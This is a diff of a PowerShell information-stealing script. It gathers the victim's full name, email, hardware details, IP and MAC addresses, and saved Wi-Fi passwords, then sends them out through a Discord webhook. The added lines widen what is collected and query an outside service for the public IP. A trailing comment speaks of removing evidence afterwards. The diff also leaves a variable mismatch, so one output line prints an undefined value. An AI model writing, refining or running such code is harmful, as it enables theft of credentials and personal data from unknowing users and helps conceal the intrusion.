@@ -128,25 +128,33 @@ try {
 # Get System Information: Print System Details to Console
 Write-Host "Building System Details..."
 
-# System Info Retrieval
-$hostname = (Get-ComputerInfo).CsName
-$os = (Get-ComputerInfo).OsName
-$osVersion = (Get-ComputerInfo).WindowsVersion
-$cpu = (Get-CimInstance -ClassName Win32_Processor).Name
-$ram = [math]::round((Get-CimInstance -ClassName Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
-$bios = (Get-CimInstance -ClassName Win32_BIOS).SMBIOSBIOSVersion
-$ipAddress = Get-NetIPAddress | Where-Object { $_.AddressFamily -eq 'IPv4' -and $_.InterfaceAlias -notlike '*Loopback*' } | Select-Object -ExpandProperty IPAddress
+# System Info Retrieval (Updated)
+try {
+    $hostname = $env:COMPUTERNAME
+    $os = (Get-CimInstance -ClassName Win32_OperatingSystem).Caption
+    $osVersion = (Get-CimInstance -ClassName Win32_OperatingSystem).Version
+    $cpu = (Get-CimInstance -ClassName Win32_Processor).Name
+    $ram = [math]::round((Get-CimInstance -ClassName Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
+    $bios = (Get-CimInstance -ClassName Win32_BIOS).SMBIOSBIOSVersion
+    $mac = (Get-NetAdapter | Where-Object { $_.Status -eq "Up" }).MacAddress
+    $localIP = (Get-NetIPAddress | Where-Object { $_.AddressFamily -eq 'IPv4' -and $_.InterfaceAlias -notlike '*Loopback*' }).IPAddress -join ", "
+    $publicIP = (curl ipinfo.io/ip).Content.Trim()
 
-# Format System Info Output
-$systemInfo = @"
+# Construct System Details
+    $SystemDetails = @"
 Hostname: $hostname
 OS: $os
 OS Version: $osVersion
 CPU: $cpu
 RAM: $ram GB
 BIOS Version: $bios
-IP Address: $ipAddress
+Local IP Address: $localIP
+MAC Address: $mac
+Public IP: $publicIP
 "@
+} catch {
+    $SystemDetails = "Error: Unable to retrieve full system details. Exception: $($_.Exception.Message)"
+}
 
 # Output or Send via Discord Webhook
 Write-Output $systemInfo
@@ -396,24 +404,16 @@ function Send-ToDiscord {
     }
 }
 
-# Main Script: Gather System Information
+# Main Script: Construct Full System Information
 $FullName = Get-FullName
 $Email = Get-Email
 $HostName = $env:COMPUTERNAME
 $WiFiPasswords = Get-WifiPasswords
-$computerPubIP
-$localIP
-$MAC
-$IsDHCPEnabled
+
 $SystemInfo = @"
 User: $FullName
 Email: $Email
 Hostname: $HostName
-Public IP: $computerPubIP
-Local IP(s): $localIP
-MAC Address: $MAC
-DHCP Enabled: $IsDHCPEnabled
-
 System Details:
 $SystemDetails
 
@@ -421,9 +421,9 @@ Wi-Fi Passwords:
 $WiFiPasswords
 "@
 
-# Send the Full System Info to Discord, Handling Long Messages
-Write-Host "Sending System Info directly to Discord."
+# Send the Full System Info to Discord
 Send-ToDiscord -Message $SystemInfo
+
 ##########################
 
 #This is to clean up behind you and remove any evidence 
